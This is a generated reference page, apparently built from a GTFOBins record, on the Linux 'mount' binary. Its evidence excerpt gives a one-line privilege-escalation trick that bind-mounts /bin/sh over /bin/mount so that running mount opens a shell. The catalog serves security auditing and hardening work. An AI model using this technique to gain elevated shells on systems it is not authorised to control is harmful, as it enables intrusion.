---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# mount

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `mount` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mount` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for mount covering privilege-escalation.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/mount.md)
- Source verification: [source record](../../sources/gtfobins/mount.md)

## Aliases

- `mount`

## Source Verification

[source record](../../sources/gtfobins/mount.md)

## Evidence Excerpt

```text
_body: ''
_name: mount
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mount
functions:
privilege-escalation:
- code: 'mount -o bind /bin/sh /bin/mount
mount'
comment: This overrides `mount` itself with a shell (or any other executable).
```
